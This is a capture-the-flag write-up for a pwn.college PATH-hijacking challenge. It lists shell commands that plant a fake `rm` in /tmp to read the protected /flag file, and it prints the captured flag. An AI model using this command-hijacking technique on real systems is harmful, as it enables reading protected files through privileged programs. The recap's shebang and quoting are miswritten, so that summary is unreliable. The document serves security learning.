### Hijacking Commands 

Armed with your knowledge, you can now carry out some shenanigans. This challenge is almost the same as the first challenge in this module. Again, this challenge will delete the flag using the `rm` command. But unlike before, it will _not_ print anything out for you.

How can you solve this? You know that `rm` is searched for in the directories listed in the `PATH` variable. You have experience creating the `win` command when the previous challenge needed it. What else can you create?

**flag:** `pwn.college{YzDL75kWzJOTS8gE3AOQBjkSqbF.QX3cjM1wyNwkzNyEzW}`

Command used: 

`echo "#!/bin/bash" >> /tmp/rm`

`echo "cat /flag" >> /tmp/rm`

`chmod +x /tmp/rm`

`export PATH="/tmp:$PATH"`

`/challenge/run`

Breakdown: 
- `echo "!#/bin/bash\ncat /flag >> /tmp/rm` -> writes output of echo to the file `/tmp/rm`
- `chmod +x /tmp/rm`  -> Made the file executable 
- `export PATH="/tmp:$PATH"` -> Wrote to PATH 
- Ran `/challenge/run` to get the flag

